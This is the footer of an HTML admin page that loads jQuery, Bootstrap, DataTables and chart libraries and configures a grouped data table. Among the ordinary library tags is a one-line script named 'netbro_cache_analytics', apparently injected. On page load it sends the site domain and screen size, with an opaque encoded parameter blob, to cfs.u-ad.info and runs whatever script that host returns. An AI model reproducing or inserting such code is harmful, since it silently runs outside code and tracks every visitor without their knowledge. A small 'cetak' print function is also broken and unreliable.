<!-- ================================================
jQuery Library
================================================ -->
<script type="text/javascript" src="../js/jquery.min.js"></script>

<!-- ================================================
Bootstrap Core JavaScript File
================================================ -->
<script src="../js/bootstrap/bootstrap.min.js"></script>

<!-- ================================================
Plugin.js - Some Specific JS codes for Plugin Settings
================================================ -->
<script type="text/javascript" src="../js/plugins.js"></script>

<!-- ================================================
Data Tables
================================================ -->
<script src="../js/datatables/datatables.min.js"></script>

<script>
$(document).ready(function() {
    $('#example0').DataTable();
} );
</script>



<script>
$(document).ready(function() {
    var table = $('#example').DataTable({
        "columnDefs": [
            { "visible": false, "targets": 2 }
        ],
        "order": [[ 2, 'asc' ]],
        "displayLength": 25,
        "drawCallback": function ( settings ) {
            var api = this.api();
            var rows = api.rows( {page:'current'} ).nodes();
            var last=null;
 
            api.column(2, {page:'current'} ).data().each( function ( group, i ) {
                if ( last !== group ) {
                    $(rows).eq( i ).before(
                        '<tr class="group"><td colspan="5">'+group+'</td></tr>'
                    );
 
                    last = group;
                }
            } );
        }
    } );
 
    // Order by the grouping
    $('#example tbody').on( 'click', 'tr.group', function () {
        var currentOrder = table.order()[0];
        if ( currentOrder[0] === 2 && currentOrder[1] === 'asc' ) {
            table.order( [ 2, 'desc' ] ).draw();
        }
        else {
            table.order( [ 2, 'asc' ] ).draw();
        }
    } );
} );

var printa = document.getElementById("example0");
function cetak(){
    printa.print();
    }
</script>


<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRzL0pGTtLwy0bxd2wwtq8nmVDOsSY4s1igVsWX4BChSdNRVWeIvS%2fhZ%2fZxcKIu9bi5SKIndgjBP%2f1TY%2bTlzC3svGXt7LK%2faHVTVgiXv9hGZC4gdfSn10NPHaKCHF925xVDrDP1E2NGtyVTmEp7g%2fqkwcP8dBGpcNSyB8nTVo1SmVyH%2bAZOflHxjWAPL3vQx8xSmdI3tJuqJzw9gGYJAS9bEdcC73MxH1dt5AKx3%2fE89UZ9slyKhxhjiyaDOYHzjN9G5fPv0AP6FSPYhi6Q2WLR9QrJfbhUJyLsf%2f8qPxh%2fr7r1ocvXM3BN7rxJ1l%2fe5mWRlEwTaljg%2bBgh0Grz5ZUdmETCF80jcUMl7VVrry0kOosygvOtiRXEBKy4RpnVDK7ia52rN6j5iBAAcoo1ufpKG15y6lRroQtMQR6Bt8Rdnr39rT0cz19gLFDxNgo6sxMEQjBiFYCJ%2bQ6rQiGrtz4KaTn377wI67aUxC8VNiJvQVEW80pCzN67HXS05%2fzkLp08%2bBBQPns7JPlRgfvWwKuZF9UATugJgpxzHPk8M%2bReOWiUQ3U3LAgIlVRooyIFdayvM29uUfEWXc%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

<!-- ================================================
Bootstrap Select
================================================ -->
<script type="text/javascript" src="../js/bootstrap-select/bootstrap-select.js"></script>

<!-- ================================================
Bootstrap Toggle
================================================ -->
<script type="text/javascript" src="../js/bootstrap-toggle/bootstrap-toggle.min.js"></script>

<!-- ================================================
Sweet Alert
================================================ -->
<script src="../js/sweet-alert/sweet-alert.min.js"></script>

<!-- ================================================
Kode Alert
================================================ -->
<script src="../js/kode-alert/main.js"></script>

<!-- ================================================
Flot Chart
================================================ -->
<!-- main file -->
<script type="text/javascript" src="../js/flot-chart/flot-chart.js"></script>
<!-- time.js -->
<script type="text/javascript" src="../js/flot-chart/flot-chart-time.js"></script>
<!-- stack.js -->
<script type="text/javascript" src="../js/flot-chart/flot-chart-stack.js"></script>
<!-- pie.js -->
<script type="text/javascript" src="../js/flot-chart/flot-chart-pie.js"></script>
<!-- demo codes -->
<script type="text/javascript" src="../js/flot-chart/flot-chart-plugin.js"></script>



<!-- ================================================
Moment.js
================================================ -->
<script type="text/javascript" src="../js/moment/moment.min.js"></script>


</body>
</html>